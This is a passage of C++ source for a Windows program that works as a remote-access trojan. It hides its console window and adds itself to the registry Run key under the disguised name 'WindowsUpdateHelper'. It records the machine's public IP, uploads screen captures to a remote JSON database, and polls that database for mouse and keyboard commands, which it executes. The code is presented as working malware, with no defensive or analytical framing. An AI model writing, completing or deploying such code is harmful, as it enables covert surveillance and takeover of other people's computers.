            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\",\"scale\":" + std::string(scaleStr) + "}";
            httpsPut("/live/" + fbEsc(computerName) + ".json", body);
        } catch(...) {}
        DWORD elapsed = GetTickCount() - t0;
        if (elapsed < (DWORD)TARGET_MS) Sleep(TARGET_MS - elapsed);
    }
    return 0;
}

DWORD WINAPI inputThread(LPVOID) {
    Sleep(3000);
    while(true) {
        Sleep(15);
        try {
            std::string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            bool hasEvents = false;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != std::string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == std::string::npos) { pos++; continue; }
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                std::string item = resp.substr(objStart, objEnd - objStart - 1);
                std::string type = extractJson(item, "type");
                std::string payload = extractJson(item, "payload");
                if (type.empty()) { pos = objEnd; continue; }
                hasEvents = true;
                try {
                    if (type == "mouse") handleMouse(payload);
                    else if (type == "keyboard") handleKeyboard(payload);
                } catch(...) {}
                pos = objEnd;
            }
            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
        } catch(...) {}
    }
    return 0;
}

void installStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
        if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
        RegCloseKey(hKey);
    }
}

int main(int argc, char* argv[]) {
    bool noStartup = false, noScreen = false, showConsole = false;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        if (a == "--no-startup") noStartup = true;
        else if (a == "--no-ping") g_noPing = true;
        else if (a == "--no-screen") noScreen = true;
        else if (a == "--show") showConsole = true;
        else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
        else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
    }
    if (computerName.empty()) computerName = getComputerName();
    HWND hwnd = GetConsoleWindow();
    if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
    publicIP = getPublicIP();
    if (!noStartup) installStartup();
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    CreateThread(0, 0, pollThread, 0, 0, 0);
    CreateThread(0, 0, inputThread, 0, 0, 0);
    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    GdiplusShutdown(gdiplusToken);
}
